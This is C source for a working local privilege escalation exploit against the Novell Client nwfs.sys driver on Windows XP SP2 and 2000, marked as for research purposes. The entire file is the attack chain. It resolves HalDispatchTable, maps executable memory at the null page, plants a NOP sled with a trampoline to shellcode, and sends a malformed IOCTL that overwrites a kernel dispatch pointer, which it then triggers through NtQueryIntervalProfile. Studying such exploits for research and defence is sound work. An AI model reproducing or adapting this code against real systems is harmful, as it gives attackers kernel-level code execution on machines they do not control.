// Novell Client SP4 NetwareRedirector Driver nwfs.sys local privilege escalation
// Ruben Santamarta www.reversemode.com
// For research purposes ONLY

#include "stdafx.h"

#define MAGIC_IOCTL 0x1438BB

BOOL FlagVulnerable = FALSE;

typedef enum _KPROFILE_SOURCE {


    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum

} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef DWORD (WINAPI *PNTQUERYINTERVAL)(  KPROFILE_SOURCE ProfileSource,
										   PULONG          Interval );

typedef NTSTATUS (WINAPI *PNTALLOCATE)(	IN HANDLE               ProcessHandle,
										IN OUT PVOID            *BaseAddress,
										IN ULONG                ZeroBits,
										IN OUT PULONG           RegionSize,
										IN ULONG                AllocationType,
										IN ULONG                Protect );

 int Callback_Overview()
{
	printf("\n");
	printf("=================================================	\n");
	printf("		Novell Cliente 4.91 SP4		\n");
	printf("        nwfs.sys Privilege Escalation Exploit	\n");
	printf("		XP SP2 && 2000\n");
	printf("=================================================	\n");
	printf("+ References:\n");
	printf("  http://support.novell.com/docs/Readmes/InfoDocument/patchbuilder/readme_5028543.html\n");
	printf("  www.reversemode.com\n\n");
	return 1;
}

_declspec(naked) int ShellCode()
{
	_asm{
		mov FlagVulnerable,1
		mov eax,0xC0000138
		retn 0x10
	}
}
int Callback_Direct(char* lpInitStr)
{
	PNTQUERYINTERVAL	NtQueryIntervalProfile;
	KPROFILE_SOURCE	stProfile = ProfileTotalIssues;
	PNTALLOCATE        NtAllocateVirtualMemory;

	LPVOID addr = (LPVOID)3;
	DWORD		dwShellSize = 0x1000;

	ULONG_PTR	HalDispatchTable;
	ULONG_PTR	BaseNt=0;
	ULONG_PTR	result;

	HANDLE		hDevice;
	HMODULE		hKernel;
	
	DWORD		dwNum = 0,i = 0, b=0,junk;
	int			status=0;

	char		szNtos[MAX_PATH] = {0};

	unsigned char trampoline[]="\x68\x00\x00\x00\x00"
							   "\xc3";

	Callback_Overview();
	
	
	printf("\n[+] Checking device...");
	hDevice = OpenDevice(L"\\\\.\\nwfs",
						TRUE,
						FALSE,
						FALSE,
						0,
						0);

	if( hDevice == INVALID_HANDLE_VALUE )
	{ 
		printf("Failed!\n\n");
		return FALSE;
	}
	printf("OK\n");
	
		
	if( GetDriverInfoByName("krnl",szNtos,&BaseNt) )
	{
		printf("[+] %s loaded at   \t [ 0x%p ]\n",szNtos,BaseNt);
		
	}
	else 
	{
		printf("[!!] Kernel not found :?\n");
		return FALSE;
	}

	if( strstr(szNtos,"krnlpa") )
	{
		hKernel = LoadLibraryExA("ntkrnlpa.exe",0,1);	
	}
	else
	{
		hKernel = LoadLibraryExA("ntoskrnl.exe",0,1);
	}	

	HalDispatchTable = (ULONG_PTR)GetProcAddress(hKernel,
												"HalDispatchTable");

	if( !HalDispatchTable )
	{
		printf("[!!] HalDispatchTable not found\n");
		return FALSE;
	}

	


	HalDispatchTable -= ( ULONG_PTR )hKernel;
	HalDispatchTable += BaseNt;

	printf("[+] HalDispatchTable found    \t\t\t [ 0x%p ]\n",HalDispatchTable);
	
	printf("[+] NtQueryIntervalProfile ");

	NtQueryIntervalProfile = ( PNTQUERYINTERVAL ) GetProcAddress(GetModuleHandle("ntdll.dll"),
																					"NtQueryIntervalProfile");
	if( !NtQueryIntervalProfile )
	{
		printf("[!!] Unable to resolve NtQueryIntervalProfile\n");
		return FALSE;
	}
	printf( "\t\t\t [ 0x%p ]\n",NtQueryIntervalProfile ); 
	
	printf("[+] NtAllocateVirtualMemory");
	NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(GetModuleHandle(	"ntdll.dll"),
																			"NtAllocateVirtualMemory");
	
	if( !NtAllocateVirtualMemory )
	{
		printf("[!!] Unable to resolve NtAllocateVirtualMemory\n");
		return FALSE;
	}

	printf( "\t\t\t [ 0x%p ]\n",NtAllocateVirtualMemory );

	printf("\n[+] Allocating memory at [ 0x%p ]...",NULL);

	status = NtAllocateVirtualMemory(	INVALID_HANDLE_VALUE, 
										&addr, 
										0,
										&dwShellSize,
										MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, 
										PAGE_EXECUTE_READWRITE );

	if( (ULONG_PTR)addr )
	{
		printf("[*] Error allocating memory\n");
		return 0;
	}
	printf("OK\n");

	printf("[+] Building shellcode...");
	memset((void*)addr,0x90,0x100);
	*(ULONG_PTR*)(trampoline+1)=(ULONG_PTR)ShellCode;
	memcpy((void*)((ULONG_PTR)addr+0x20),trampoline,sizeof(trampoline)-1);
	printf("OK\n");
	printf("[+] Sending malformed request...");
	
	DeviceIoControl(hDevice,
					MAGIC_IOCTL,
					(LPVOID)(HalDispatchTable+sizeof(ULONG_PTR)),0x10,
					NULL,0,
					&junk,
					NULL);
	printf("OK\n");

	printf("[+] Executing shellcode...");
	Sleep(2000);
	NtQueryIntervalProfile(stProfile,&result);
	printf("OK\n");
	if(FlagVulnerable)
		printf("\n\n[+] Shellcode executed successfully!\n");
	else
		printf("\n\n[**]ERROR: Shellcode not triggered\n");
	printf("[+] Exiting...\n");
	CloseHandle(hDevice);
	
	
	
	return status;
}

